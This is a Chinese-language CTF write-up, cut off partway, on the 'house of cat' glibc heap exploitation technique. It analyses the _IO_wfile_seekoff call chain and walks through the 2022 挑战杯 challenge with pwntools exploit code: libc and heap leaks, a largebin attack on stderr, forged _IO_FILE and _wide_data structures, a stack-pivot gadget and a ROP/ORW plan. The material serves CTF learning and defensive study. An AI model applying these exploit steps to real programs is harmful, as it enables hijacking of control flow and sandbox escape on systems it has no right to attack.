#### **适用版本：**
> glibc 2.23 -- 至今
‍
#### **利用条件:**
>   * 可以进行一次任意地址写堆地址
>   * 可以触发 IO 流操作
>
‍
#### 攻击方法：
>   * 劫持stderr指针为我们构造的fake_IO_FILE（伪造好stderr和_wide_data结构体）
>   * 触发 IO 流操作
>
‍
#### 源码分析：
触发`__malloc_assert`​后会有这样一条调用链：
​`__malloc_assert -> __fxprintf -> __vfxprintf->locked_vfxprintf ->
__vfprintf_internal -> _IO_file_xsputn`​
其中`_IO_file_xsputn`​是通过`vtable`​
处的指针来调用，且在`_IO_file_jumps`​中`_IO_file_xsputn`​函数和`_IO_wfile_seekoff`​相差0x10大小
​​
我们通过劫持 `_IO_2_1_stderr`​ 结构体，并将 `vtable`​
处的指针改为`_IO_wfile_seekoff`​，来执行我们想要的链：
​`_IO_wfile_seekoff -> _IO_switch_to_wget_mode`​->`_IO_WOVERFLOW`​
    //_IO_wfile_seekoff函数源码
    off64_t
    _IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)
    {
      off64_t result;
      off64_t delta, new_offset;
      long int count;
      if (mode == 0)
        return do_ftell_wide (fp);
      int must_be_exact = ((fp->_wide_data->_IO_read_base
                == fp->_wide_data->_IO_read_end)
                   && (fp->_wide_data->_IO_write_base
                   == fp->_wide_data->_IO_write_ptr));
      bool was_writing = ((fp->_wide_data->_IO_write_ptr
                   > fp->_wide_data->_IO_write_base)
                  || _IO_in_put_mode (fp));
      if (was_writing && _IO_switch_to_wget_mode (fp))
        return WEOF;
    ......
    }
通过 `_IO_wfile_seekoff`​ 函数来触发 `_IO_switch_to_wget_mode`​ 函数，进而执行
`_IO_switch_to_wget_mode`​ 函数再触发宏调用函数`_IO_WOVERFLOW`​
    //_IO_switch_to_wget_mode 函数源码
    _IO_switch_to_wget_mode (FILE *fp)
    {
      if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
        if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
          return EOF;
    ......
    }
若满足 `fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base`​
这个条件，`_IO_WOVERFLOW`​ 函数会通过跳转到`_wide_vtable`​ 中的函数指针
我们可以通过控制`_wide_vtable`​处的指针，来劫持程序的执行流
若未开沙箱，则可直接劫持`_wide_vtable`​为one_gadget
若execve函数被禁，则可通过magic_gadget和leave_ret构造栈迁移，来完全控制程序流执行rop链，详细可以在[CTF 中
glibc堆利用 及 IO_FILE
总结](https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_32) 学习
> magic_gadget：
>
> : mov rbp,QWORD PTR [rdi+0x48]
>
> : mov rax,QWORD PTR [rbp+0x18]
>
> : lea r13,[rbp+0x10]
>
> : mov DWORD PTR [rbp+0x10],0x0
>
> : mov rdi,r13
>
> : call QWORD PTR [rax+0x28]
‍
#### 例题2022挑战杯 house of cat
保护全开，开了沙箱
​​
##### 程序分析：
限制申请大小 0x418-0x46f，限制修改次数两次并只能修改0x30字节
存在UAF漏洞，限制泄露数据最大大小为0x30字节
‍
题目除了前面的加密，本身算是一道标准的菜单题，不过我们主要是要分析这道题里house of cat手法如何利用，前面需要逆向的部分不再赘述
由于开了沙箱的缘故，我们需要构造orw来读取flag。此外，送入orw前还需要构造close(0)，将标准输入关闭掉，这样再次read的时候flag文件描述符就将是0，则可以正常read
flag文件
‍
##### 利用详解：
>   * **首先是泄露libc地址和heap地址**
>   * **伪造好stderr和_wide_data结构体**
>   * **largebin attack攻击stderr指针**
>   * **修改top_chunk大小并触发IO调用**
>   * **进入 house of cat 的调用链，通过_wide_data- >vtable跳转到提前布置好的地址进行栈迁移**
>   * **栈迁移后便已完全控制程序流，跳转执行rop链**
>
‍
‍
首先看一下我们要伪造的两个结构体stderr和_IO_wide_data伪造前的样子
**stderr**
    p *(struct _IO_FILE_plus*) stderr
    pwndbg> p _IO_2_1_stderr_
    $1 = {
      file = {
        _flags = -72540025,
        _IO_read_ptr = 0x7ff44001a723  "",
        _IO_read_end = 0x7ff44001a723  "",
        _IO_read_base = 0x7ff44001a723  "",
        _IO_write_base = 0x7ff44001a723  "",
        _IO_write_ptr = 0x7ff44001a723  "",
        _IO_write_end = 0x7ff44001a723  "",
        _IO_buf_base = 0x7ff44001a723  "",
        _IO_buf_end = 0x7ff44001a724  "",
        _IO_save_base = 0x0,
        _IO_backup_base = 0x0,
        _IO_save_end = 0x0,
        _markers = 0x0,
        _chain = 0x7ff44001a780 ,
        _fileno = 2,
        _flags2 = 0,
        _old_offset = -1,
        _cur_column = 0,
        _vtable_offset = 0 '\000',
        _shortbuf = "",
        _lock = 0x7ff44001ba60 ,
        _offset = -1,
        _codecvt = 0x0,
        _wide_data = 0x7ff4400198a0 ,
        _freeres_list = 0x0,
        _freeres_buf = 0x0,
        __pad5 = 0,
        _mode = 0,
        _unused2 = '\000' 
      },
      vtable = 0x7ff440016600 
    }
**_IO_wide_data**
    p *(struct _IO_wide_data*) 0x555555554000
    #0x555555554000为heap基地址
    pwndbg> p *(struct _IO_wide_data*) 0x558944aed000
    $2 = {
      _IO_read_ptr = 0x10102464c457f ,
      _IO_read_end = 0x0,
      _IO_read_base = 0x1003e0003 ,
      _IO_write_base = 0x11f0 ,
      _IO_write_ptr = 0x40 ,
      _IO_write_end = 0x3148 ,
      _IO_buf_base = 0x38004000000000 ,
      _IO_buf_end = 0x1c001d0040000d ,
      _IO_save_base = 0x400000006 ,
      _IO_backup_base = 0x40 ,
      _IO_save_end = 0x40 ,
      _IO_state = {
        __count = 64,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _IO_last_state = {
        __count = 728,
        __value = {
          __wch = 0,
          __wchb = "\000\000\000"
        }
      },
      _codecvt = {
        __cd_in = {
          step = 0x2d8,
          step_data = {
            __outbuf = 0x8 ,
            __outbufend = 0x400000003 ,
            __flags = 792,
            __invocation_counter = 0,
            __internal_use = 792,
            __statep = 0x318,
            __state = {
              __count = 28,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        },
        __cd_out = {
          step = 0x1c,
          step_data = {
            __outbuf = 0x1 ,
            __outbufend = 0x400000001 ,
            __flags = 0,
            __invocation_counter = 0,
            __internal_use = 0,
            __statep = 0x0,
            __state = {
              __count = 2512,
              __value = {
                __wch = 0,
                __wchb = "\000\000\000"
              }
            }
          }
        }
      },
      _shortbuf = L"\x9d0",
      _wide_vtable = 0x1000
    }
​​
‍
‍
‍
##### 获取libc基址和heap基址
    add(14,0x450,b'o')
    add(13,0x450,b'p')
    delete(14)
    add(12,0x460,b'n')
    show(14)
    p.recvuntil('Context:\n')
    libc_base=l64()-0x21a0e0#-0x10-libc.sym['__malloc_hook']
    li('libc_base = '+hex(libc_base))
    heap_base = u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))-0x290
    li('heap_base = '+hex(heap_base))
‍
##### largebin attack攻击stderr指针
    fake_file=p64(1)*4
    fake_file+=p64(0)*3
    fake_file+=p64(heap_base+0x1180+0x30) 
    #_IO_save_base -- _IO_2_1_stderr_+72
    fake_file+=p64(0)*7
    fake_file+=p64(lock)+p64(0)*2
    #_IO_stdfile_2_lock
    fake_file+=p64(heap_base+0x10a0)
    #_wide_data
    fake_file+=p64(0)*6
    fake_file+=p64(IO_wfile_jumps+0x10)
    #fake_file+=
    add(0,0x428,fake_file)
​​
    pl=p64(libc_base+0x21a0d0)*2+p64(IO_list_all)+p64(stderr-0x20)
    edit(0,pl)
    #main_arena+1104  main_arena+1104
    #IO_list_all      stderr-0x20
    delete(1) #ub
    add(3,0x440,b'c') #attack
​​
‍
##### 修改top_chunk大小并触发IO调用
    add(4,0x418,b'd') #r chunk1
>
> ​​
>
> freed
>
> chunk 15
>
> chunk 4
>
> chunk 2
>
> chunk 3
‍
‍
    pl=p64(heap_base+0x2e20)+p64(libc_base+0x21a0e0)+p64(heap_base+0x2e20)+p64(heap_base+0x3263-0x20)
    edit(3,pl)
    #chunk9+0x30  main_arena+1120
    #chunk9+0x30  &TopChunk_Size+3 -0x20
    delete(8) #ub
    delete(14) 
    add(10,0x450,b'a') #attack
​​
​​
‍
##### 模板详解：
###### part 1
    #print('==============================================part 1
    chunk0 = heap_base+0xfc0
    fake_file=p64(1)*4
    fake_file+=p64(0)*3
    fake_file+=p64(chunk0+0x1c0+0x30)
    #_IO_save_base -- _IO_2_1_stderr_+72
    fake_file+=p64(0)*7
    fake_file+=p64(lock)+p64(0)*2
    #_IO_stdfile_2_lock
    fake_file+=p64(chunk0+0xe0) #wide_data start
    #_wide_data
    fake_file+=p64(0)*6
    fake_file+=p64(IO_wfile_jumps+0x10)
    #vtable
    fake_file+=wide_data
构造后的stderr，我们将_IO_save_base改为chunk0+0x1c0+0x30
将_wide_data地址改为我们送入chunk0中的payload中wide_data这部分的地址，以进行_wide_data结构体的构造
    pwndbg> p *stderr
    $3 = {
      _flags = 0,
      _IO_read_ptr = 0x431 ,
      _IO_read_end = 0x7f0cbec1a0d0  "\300\240\301\276\f\177",
      _IO_read_base = 0x7f0cbec1a0d0  "\300\240\301\276\f\177",
      _IO_write_base = 0x7f0cbec1a680  "\240\246\301\276\f\177",
      _IO_write_ptr = 0x7f0cbec1a840  "",
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x559ea0e1c1b0 ,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0,
      _flags2 = 0,
      _old_offset = 0,
      _cur_column = 0,
      _vtable_offset = 0 '\000',
      _shortbuf = "",
      _lock = 0x7f0cbec1ba60 ,
      _offset = 0,
      _codecvt = 0x0,
      _wide_data = 0x559ea0e1c0a0,
      _freeres_list = 0x0,
      _freeres_buf = 0x0,
      __pad5 = 0,
      _mode = 0,
      _unused2 = '\000' 
    }
‍
###### part 2
    #print('==============================================part 2
    wide_data=p64(0)*4+p64(1) #_IO_write_ptr
    wide_data+=p64(0)*20
    wide_data+=b'flag\x00\x00\x00\x00' #_statep  #flag_addr
    wide_data+=p64(0)*2
    wide_data+=p64(heap_base+0x1170) #wide_data+=p64(0)*2 1
    wide_data+=pivot
看下面我们构造后的_IO_wide_data
_wide_vtable被我们修改为了chunk0+0x1b0
​​​​​​
这里的0x000055f6c4a410a0就是我们送入chunk0中的payload中的wide_data这部分的地址（chunk0+0xe0）
    pwndbg> p *(struct _IO_wide_data*) 0x000055f6c4a410a0
    $4 = {
      _IO_read_ptr = 0x0,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x1 ,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _IO_state = {
        __count = 0,